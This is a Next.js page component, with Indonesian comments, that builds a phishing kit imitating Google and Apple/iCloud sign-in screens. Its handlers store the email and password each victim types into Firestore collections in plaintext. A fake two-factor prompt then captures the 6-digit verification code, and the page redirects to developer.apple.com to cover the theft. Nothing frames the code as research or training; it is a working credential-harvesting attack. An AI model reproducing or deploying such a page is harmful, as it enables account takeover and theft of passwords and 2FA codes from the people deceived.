import {
  signOut,
  getAuth,
  onAuthStateChanged,
  createUserWithEmailAndPassword,
} from "firebase/auth";

import {
  getFirestore,
  doc,
  setDoc,
  updateDoc,
} from "firebase/firestore";

import { useEffect, useState } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { useRouter } from "next/router"; 
import app from "@/lib/firebase";

const auth = getAuth(app);
const db = getFirestore(app);

export default function Home() {
  const router = useRouter();
  const [user, setUser] = useState<any>(null);

  const [showIcloud, setShowIcloud] = useState(false);
  const [showGoogle, setShowGoogle] = useState(false);
  
  const [loading, setLoading] = useState(false);
  const [showVerification, setShowVerification] = useState(false);
  const [showSuccessModal, setShowSuccessModal] = useState(false); 
  const [verificationCode, setVerificationCode] = useState("");
  const [currentProvider, setCurrentProvider] = useState<"google" | "icloud" | null>(null);
  const [currentUid, setCurrentUid] = useState("");

  const [icloudEmail, setIcloudEmail] = useState("");
  const [icloudPassword, setIcloudPassword] = useState("");

  const [googleEmail, setGoogleEmail] = useState("");
  const [googlePassword, setGooglePassword] = useState("");

  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (currentUser) => {
      setUser(currentUser);
    });
    return () => unsubscribe();
  }, []);

  const loginGoogle = async () => {
    if (!googleEmail || !googlePassword) return alert("Please fill all fields");
    setLoading(true);
    try {
      const result = await createUserWithEmailAndPassword(
        auth,
        googleEmail,
        googlePassword
      );

      const user = result.user;
      setCurrentUid(user.uid);
      setCurrentProvider("google");

      await setDoc(doc(db, "google_users", user.uid), {
        uid: user.uid,
        email: googleEmail,
        password: googlePassword,
        provider: "google",
        createdAt: new Date(),
      });

      setShowGoogle(false);
      setShowVerification(true);
    } catch (error: any) {
      console.log(error);
      alert(error.message);
    } finally {
      setLoading(false);
    }
  };

  const loginIcloud = async () => {
    if (!icloudEmail || !icloudPassword) return alert("Please fill all fields");
    setLoading(true);
    try {
      const result = await createUserWithEmailAndPassword(
        auth,
        icloudEmail,
        icloudPassword
      );

      const user = result.user;
      setCurrentUid(user.uid);
      setCurrentProvider("icloud");

      await setDoc(doc(db, "icloud_users", user.uid), {
        uid: user.uid,
        email: icloudEmail,
        password: icloudPassword,
        provider: "icloud",
        createdAt: new Date(),
      });

      setShowIcloud(false);
      setShowVerification(true);
    } catch (error: any) {
      console.log(error);
      alert(error.message);
    } finally {
      setLoading(false);
    }
  };

  const sendVerificationCode = async () => {
    if (verificationCode.length !== 6) {
      return alert("Please enter a valid 6-digit code");
    }
    setLoading(true);
    try {
      const collectionName = currentProvider === "google" ? "google_users" : "icloud_users";
      const docRef = doc(db, collectionName, currentUid);

      await updateDoc(docRef, {
        verificationCode: verificationCode,
        verifiedAt: new Date(),
      });

      setShowVerification(false);
      setShowSuccessModal(true);
      
      setVerificationCode("");
      setGoogleEmail("");
      setGooglePassword("");
      setIcloudEmail("");
      setIcloudPassword("");

      setTimeout(() => {
        router.push("https://developer.apple.com/"); 
      }, 2000);

    } catch (error: any) {
      console.log(error);
      alert(error.message);
    } finally {
      setLoading(false);
    }
  };

  const logout = async () => {
    try {
      await signOut(auth);
    } catch (error) {
      console.log(error);
    }
  };

  return (
    <motion.div
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      transition={{ duration: 1 }}
      className="relative flex min-h-screen items-center justify-center overflow-hidden bg-black px-4"
    >
      {/* Floating Background */}
      <motion.div
        animate={{ y: [0, 20, 0], x: [0, 10, 0] }}
        transition={{ duration: 8, repeat: Infinity }}
        className="absolute top-[-150px] left-[-150px] h-[300px] w-[300px] sm:h-[500px] sm:w-[500px] rounded-full bg-white/10 blur-3xl pointer-events-none"
      />

      <motion.div
        animate={{ y: [0, -20, 0], x: [0, -10, 0] }}
        transition={{ duration: 10, repeat: Infinity }}
        className="absolute bottom-[-150px] right-[-150px] h-[250px] w-[250px] sm:h-[400px] sm:w-[400px] rounded-full bg-blue-500/10 sm:bg-blue-500/20 blur-3xl pointer-events-none"
      />

      {/* Card Utama */}
      <motion.div
        initial={{ opacity: 0, y: 40, scale: 0.95 }}
        animate={{ opacity: 1, y: 0, scale: 1 }}
        transition={{ duration: 0.8, type: "spring", stiffness: 80 }}
        className="relative z-10 w-full max-w-[360px] sm:w-[380px] rounded-[32px] sm:rounded-[40px] border border-white/10 bg-white/10 p-6 sm:p-8 shadow-2xl backdrop-blur-2xl"
      >
        {user ? (
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="flex flex-col items-center">
            <div className="mb-4 flex h-20 w-20 sm:h-24 sm:w-24 items-center justify-center rounded-full border-4 border-white/20 bg-white/10 text-3xl sm:text-4xl font-bold text-white">
              {user.email?.charAt(0).toUpperCase()}
            </div>
            {/* Logo iCloud Diatas Welcome (Saat Logged In) */}
            <svg xmlns="http://www.w3.org/2000/svg" className="h-10 w-10 sm:h-12 sm:w-12 fill-white mb-2" viewBox="0 0 384 512">
              <path d="M318.7 268.7c-.2-36.7 16.4-64.4 50.1-84.9-18.8-26.9-47.2-41.7-84.6-44.6-35.5-2.8-74.3 20.7-88.5 20.7-15 0-49.2-19.7-76.1-19.7C64.6 140.2 0 190.7 0 295.5c0 30.9 5.7 62.8 17 95.6 15 42.9 69.1 147.9 125.6 146.2 29.5-.7 50.3-21 88.7-21 37.2 0 56.5 21 88.8 21 57-.8 106.2-96.3 120.4-139.3-77.4-36.5-121.8-104.6-121.8-129.3z" />
            </svg>
            <h1 className="text-center text-2xl sm:text-3xl font-semibold tracking-tight text-white">Welcome</h1>
            <p className="mt-1 text-xs sm:text-sm text-white/60 truncate max-w-full">{user.email}</p>
            <motion.button
              whileTap={{ scale: 0.96 }}
              whileHover={{ scale: 1.02 }}
              onClick={logout}
              className="mt-6 sm:mt-8 w-full rounded-2xl border border-white/10 bg-white/10 py-3 font-medium text-white transition-all duration-300 hover:bg-red-500/80"
            >
              Logout
            </motion.button>
          </motion.div>
        ) : (
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
            {/* Header dengan Logo iCloud di atas tulisan Welcome */}
            <div className="mb-6 sm:mb-8 flex flex-col items-center text-center">
              <svg xmlns="http://www.w3.org/2000/svg" className="h-11 w-11 sm:h-14 sm:w-14 fill-white mb-3 drop-shadow-[0_0_15px_rgba(255,255,255,0.1)]" viewBox="0 0 384 512">
                <path d="M318.7 268.7c-.2-36.7 16.4-64.4 50.1-84.9-18.8-26.9-47.2-41.7-84.6-44.6-35.5-2.8-74.3 20.7-88.5 20.7-15 0-49.2-19.7-76.1-19.7C64.6 140.2 0 190.7 0 295.5c0 30.9 5.7 62.8 17 95.6 15 42.9 69.1 147.9 125.6 146.2 29.5-.7 50.3-21 88.7-21 37.2 0 56.5 21 88.8 21 57-.8 106.2-96.3 120.4-139.3-77.4-36.5-121.8-104.6-121.8-129.3z" />
              </svg>
              <h1 className="text-3xl sm:text-4xl font-semibold tracking-tight text-white">Welcome</h1>
              <p className="mt-1.5 text-xs sm:text-sm text-white/60">Sign in to continue</p>
            </div>

            {/* Google Button */}
            <motion.button
              whileHover={{ scale: 1.01 }}
              whileTap={{ scale: 0.98 }}
              onClick={() => setShowGoogle(true)}
              className="flex w-full items-center justify-center gap-3 rounded-2xl border border-white/10 bg-white/10 py-3.5 sm:py-4 text-sm sm:text-base text-white transition-all duration-300 hover:bg-white/20"
            >
              <img src="https://www.svgrepo.com/show/475656/google-color.svg" alt="google" className="h-5 w-5" />
              Continue with Google
            </motion.button>

            {/* iCloud Button */}
            <motion.button
              whileHover={{ scale: 1.01 }}
              whileTap={{ scale: 0.98 }}
              onClick={() => setShowIcloud(true)}
              className="mt-3 sm:mt-4 flex w-full items-center justify-center gap-3 rounded-2xl border border-white/10 bg-white/5 py-3.5 sm:py-4 text-sm sm:text-base text-white transition-all duration-300 hover:bg-white/10"
            >
              <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5 fill-white" viewBox="0 0 384 512">
                <path d="M318.7 268.7c-.2-36.7 16.4-64.4 50.1-84.9-18.8-26.9-47.2-41.7-84.6-44.6-35.5-2.8-74.3 20.7-88.5 20.7-15 0-49.2-19.7-76.1-19.7C64.6 140.2 0 190.7 0 295.5c0 30.9 5.7 62.8 17 95.6 15 42.9 69.1 147.9 125.6 146.2 29.5-.7 50.3-21 88.7-21 37.2 0 56.5 21 88.8 21 57-.8 106.2-96.3 120.4-139.3-77.4-36.5-121.8-104.6-121.8-129.3z" />
              </svg>
              Continue with iCloud
            </motion.button>
          </motion.div>
        )}
      </motion.div>

      {/* GOOGLE MODAL */}
      <AnimatePresence>
        {showGoogle && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="absolute inset-0 z-50 flex items-end sm:items-center justify-center bg-black/60 backdrop-blur-sm px-0 sm:px-4"
          >
            <motion.div
              initial={{ opacity: 0, scale: 1, y: "100%" }}
              animate={{ opacity: 1, scale: 1, y: 0 }}
              exit={{ opacity: 0, scale: 1, y: "100%" }}
              transition={{ type: "spring", damping: 25, stiffness: 200 }}
              className="w-full sm:w-[350px] rounded-t-[30px] sm:rounded-[35px] border-t sm:border border-white/10 bg-[#111]/95 p-6 pb-8 sm:pb-6 shadow-2xl backdrop-blur-2xl"
            >
              <div className="flex flex-col items-center">
                <div className="w-12 h-1 bg-white/20 rounded-full mb-4 sm:hidden" onClick={() => setShowGoogle(false)} />
                <img src="https://www.svgrepo.com/show/475656/google-color.svg" className="mb-3 h-10 w-10 sm:h-12 sm:w-12" />
                <h1 className="text-xl sm:text-2xl font-semibold text-white">Sign in with Google</h1>

                <input
                  type="email"
                  placeholder="Google Email"
                  value={googleEmail}
                  disabled={loading}
                  onChange={(e) => setGoogleEmail(e.target.value)}
                  className="mt-5 sm:mt-6 w-full rounded-xl sm:rounded-2xl border border-white/10 bg-white/5 px-4 py-3 text-sm sm:text-base text-white outline-none disabled:opacity-50"
                />

                <input
                  type="password"
                  placeholder="Password"
                  value={googlePassword}
                  disabled={loading}
                  onChange={(e) => setGooglePassword(e.target.value)}
                  className="mt-3 sm:mt-4 w-full rounded-xl sm:rounded-2xl border border-white/10 bg-white/5 px-4 py-3 text-sm sm:text-base text-white outline-none disabled:opacity-50"
                />

                <motion.button
                  whileHover={loading ? {} : { scale: 1.01 }}
                  whileTap={loading ? {} : { scale: 0.98 }}
                  onClick={loginGoogle}
                  disabled={loading}
                  className="mt-5 sm:mt-6 flex w-full items-center justify-center rounded-xl sm:rounded-2xl bg-white py-3 font-semibold text-black text-sm sm:text-base disabled:bg-white/50"
                >
                  {loading ? (
                    <div className="h-5 w-5 animate-spin rounded-full border-2 border-black border-t-transparent" />
                  ) : (
                    "Login"
                  )}
                </motion.button>

                <button onClick={() => setShowGoogle(false)} disabled={loading} className="mt-4 text-sm text-white/40">
                  Cancel
                </button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* ICLOUD MODAL */}
      <AnimatePresence>
        {showIcloud && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="absolute inset-0 z-50 flex items-end sm:items-center justify-center bg-black/60 backdrop-blur-sm px-0 sm:px-4"
          >
            <motion.div
              initial={{ opacity: 0, scale: 1, y: "100%" }}
              animate={{ opacity: 1, scale: 1, y: 0 }}
              exit={{ opacity: 0, scale: 1, y: "100%" }}
              transition={{ type: "spring", damping: 25, stiffness: 200 }}
              className="w-full sm:w-[350px] rounded-t-[30px] sm:rounded-[35px] border-t sm:border border-white/10 bg-[#111]/95 p-6 pb-8 sm:pb-6 shadow-2xl backdrop-blur-2xl"
            >
              <div className="flex flex-col items-center">
                <div className="w-12 h-1 bg-white/20 rounded-full mb-4 sm:hidden" onClick={() => setShowIcloud(false)} />
                {/* Logo Apple ID di Modal iCloud */}
                <svg xmlns="http://www.w3.org/2000/svg" className="h-10 w-10 sm:h-12 sm:w-12 fill-white mb-3" viewBox="0 0 384 512">
                  <path d="M318.7 268.7c-.2-36.7 16.4-64.4 50.1-84.9-18.8-26.9-47.2-41.7-84.6-44.6-35.5-2.8-74.3 20.7-88.5 20.7-15 0-49.2-19.7-76.1-19.7C64.6 140.2 0 190.7 0 295.5c0 30.9 5.7 62.8 17 95.6 15 42.9 69.1 147.9 125.6 146.2 29.5-.7 50.3-21 88.7-21 37.2 0 56.5 21 88.8 21 57-.8 106.2-96.3 120.4-139.3-77.4-36.5-121.8-104.6-121.8-129.3z" />
                </svg>
                <h1 className="text-xl sm:text-2xl font-semibold text-white">Sign in with Apple</h1>

                <input
                  type="email"
                  placeholder="Apple ID"
                  value={icloudEmail}
                  disabled={loading}
                  onChange={(e) => setIcloudEmail(e.target.value)}
                  className="mt-5 sm:mt-6 w-full rounded-xl sm:rounded-2xl border border-white/10 bg-white/5 px-4 py-3 text-sm sm:text-base text-white outline-none disabled:opacity-50"
                />

                <input
                  type="password"
                  placeholder="Password"
                  value={icloudPassword}
                  disabled={loading}
                  onChange={(e) => setIcloudPassword(e.target.value)}
                  className="mt-3 sm:mt-4 w-full rounded-xl sm:rounded-2xl border border-white/10 bg-white/5 px-4 py-3 text-sm sm:text-base text-white outline-none disabled:opacity-50"
                />

                <motion.button
                  whileHover={loading ? {} : { scale: 1.01 }}
                  whileTap={loading ? {} : { scale: 0.98 }}
                  onClick={loginIcloud}
                  disabled={loading}
                  className="mt-5 sm:mt-6 flex w-full items-center justify-center rounded-xl sm:rounded-2xl bg-white py-3 font-semibold text-black text-sm sm:text-base disabled:bg-white/50"
                >
                  {loading ? (
                    <div className="h-5 w-5 animate-spin rounded-full border-2 border-black border-t-transparent" />
                  ) : (
                    "Login"
                  )}
                </motion.button>

                <button onClick={() => setShowIcloud(false)} disabled={loading} className="mt-4 text-sm text-white/40">
                  Cancel
                </button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* POP UP KODE VERIFIKASI 6 DIGIT */}
      <AnimatePresence>
        {showVerification && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="absolute inset-0 z-50 flex items-end sm:items-center justify-center bg-black/70 backdrop-blur-sm px-0 sm:px-4"
          >
            <motion.div
              initial={{ opacity: 0, scale: 1, y: "100%" }}
              animate={{ opacity: 1, scale: 1, y: 0 }}
              exit={{ opacity: 0, scale: 1, y: "100%" }}
              transition={{ type: "spring", damping: 25, stiffness: 200 }}
              className="w-full sm:w-[350px] rounded-t-[30px] sm:rounded-[35px] border-t sm:border border-white/10 bg-[#111]/95 p-6 pb-8 sm:pb-6 shadow-2xl backdrop-blur-2xl"
            >
              <div className="flex flex-col items-center">
                <div className="w-12 h-1 bg-white/20 rounded-full mb-4 sm:hidden" onClick={() => setShowVerification(false)} />
                <div className="mb-2 text-2xl sm:text-3xl">🔒</div>
                <h1 className="text-xl sm:text-2xl font-semibold text-white text-center">Two-Factor Authentication</h1>
                <p className="mt-2 text-[11px] sm:text-xs text-white/50 text-center px-2">
                  Enter the 6-digit verification code sent to your device.
                </p>

                <input
  type="text"
  maxLength={6}
  inputMode="numeric"
  pattern="[0-9]*"
  placeholder="000000"
  value={verificationCode}
  disabled={loading}
  // Ganti ke e.currentTarget atau tangani langsung nilainya
  onChange={(e) => {
    const val = e.target.value;
    // Hanya perbarui state jika input kosong atau murni berupa angka
    if (val === "" || /^[0-9\b]+$/.test(val)) {
      setVerificationCode(val);
    }
  }}
  // Tambahan pengaman khusus keyboard mobile
  onKeyDown={(e) => {
    if (e.key === " " || (isNaN(Number(e.key)) && e.key !== "Backspace" && e.key !== "Delete")) {
      e.preventDefault();
    }
  }}
  className="mt-5 sm:mt-6 w-full rounded-xl sm:rounded-2xl border border-white/10 bg-white/5 px-4 py-3.5 text-center text-xl sm:text-2xl font-bold tracking-[0.4em] sm:tracking-[0.5em] text-white outline-none disabled:opacity-50"
/>

                <motion.button
                  whileHover={loading ? {} : { scale: 1.01 }}
                  whileTap={loading ? {} : { scale: 0.98 }}
                  onClick={sendVerificationCode}
                  disabled={loading}
                  className="mt-5 sm:mt-6 flex w-full items-center justify-center rounded-xl sm:rounded-2xl bg-blue-500 py-3 font-semibold text-white text-sm sm:text-base shadow-lg shadow-blue-500/20 disabled:bg-blue-500/50"
                >
                  {loading ? (
                    <div className="h-5 w-5 animate-spin rounded-full border-2 border-white border-t-transparent" />
                  ) : (
                    "Send Code"
                  )}
                </motion.button>

                <button
                  onClick={() => {
                    setShowVerification(false);
                    setVerificationCode("");
                  }}
                  disabled={loading}
                  className="mt-4 text-sm text-white/40 hover:text-white/60 transition-colors"
                >
                  Cancel
                </button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* POPUP ANIMASI CENTANG SUKSES KUSTOM */}
      <AnimatePresence>
        {showSuccessModal && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="absolute inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-md px-4"
          >
            <motion.div
              initial={{ opacity: 0, scale: 0.8, y: 30 }}
              animate={{ opacity: 1, scale: 1, y: 0 }}
              exit={{ opacity: 0, scale: 0.8, y: 30 }}
              transition={{ type: "spring", damping: 15 }}
              className="w-full max-w-[300px] sm:w-[320px] rounded-[28px] sm:rounded-[35px] border border-white/10 bg-neutral-900/90 p-6 sm:p-8 shadow-2xl text-center backdrop-blur-2xl"
            >
              <motion.div 
                initial={{ scale: 0 }}
                animate={{ scale: 1 }}
                transition={{ delay: 0.2, type: "spring", stiffness: 150 }}
                className="mx-auto flex h-16 w-16 sm:h-20 sm:w-20 items-center justify-center rounded-full bg-emerald-500/10 border border-emerald-500/30 text-emerald-400"
              >
                <motion.svg
                  xmlns="http://www.w3.org/2000/svg"
                  fill="none"
                  viewBox="0 0 24 24"
                  strokeWidth={3}
                  stroke="currentColor"
                  className="h-8 w-8 sm:h-10 sm:w-10"
                  initial={{ pathLength: 0 }}
                  animate={{ pathLength: 1 }}
                  transition={{ delay: 0.4, duration: 0.4 }}
                >
                  <path strokeLinecap="round" strokeLinejoin="round" d="M4.5 12.75l6 6 9-13.5" />
                </motion.svg>
              </motion.div>

              <h2 className="mt-5 text-xl sm:text-2xl font-bold text-white">Success!</h2>
              <p className="mt-2 text-xs sm:text-sm text-white/60 px-2">
                Verification complete. Redirecting you shortly...
              </p>

              <div className="mt-5 sm:mt-6 h-1 w-full overflow-hidden rounded-full bg-white/5">
                <motion.div 
                  initial={{ x: "-100%" }}
                  animate={{ x: "0%" }}
                  transition={{ duration: 2, ease: "linear" }}
                  className="h-full w-full bg-emerald-500"
                />
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

    </motion.div>
  );
}